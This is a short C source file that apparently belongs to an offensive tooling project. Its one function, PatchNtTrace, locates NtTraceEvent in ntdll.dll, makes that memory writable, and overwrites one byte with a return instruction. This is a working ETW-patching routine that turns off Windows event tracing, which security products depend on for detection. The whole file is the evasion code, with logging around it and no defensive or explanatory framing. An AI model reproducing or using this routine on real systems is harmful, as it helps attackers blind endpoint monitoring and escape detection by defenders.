#include "Box.h"

// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c

BOOL PatchNtTrace()
{

	DWORD dwOldProt = 0;
	PBYTE NtTrace = NULL;

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		PRINT_ERROR("GetModuleHandleA");
		return FALSE;
	}

	INFO("[0x%p] Current Ntdll Handle", ntdll);

	NtTrace = (PBYTE)GetProcAddress(ntdll, "NtTraceEvent"); 
	if (NtTrace == NULL) 
	{ 
		PRINT_ERROR("GetProcAddress"); 
		return FALSE; 
	}

	printf("[*] NtTraceEvent first 8 bytes before:\n");
	for (int i = 0; i < 8; i++)
		printf("  %02X", NtTrace[i]);
	printf("\n");

	INFO("Attempting VirtualProtect at %p (offset +3)", NtTrace + 3);

	if (!VirtualProtect(NtTrace + 3, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	INFO("Protection changed to RWX, old protection: 0x%X", dwOldProt);
	INFO("Byte at [NtTraceEvent + 3] before: 0x%02X", NtTrace[3]);

	memcpy(NtTrace + 3, "\xc3", 1);

	INFO("Byte at [NtTraceEvent + 3] after : 0x%02X", NtTrace[3]);

	if (!VirtualProtect(NtTrace + 3, sizeof(DWORD), dwOldProt, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	INFO("Protection Restored");

	printf("[*] NtTraceEvent first 8 bytes after:\n");
	for (int i = 0; i < 8; i++)
		printf("  %02X", NtTrace[i]);
	printf("\n");


	OKAY("DONE!");

	return TRUE;

}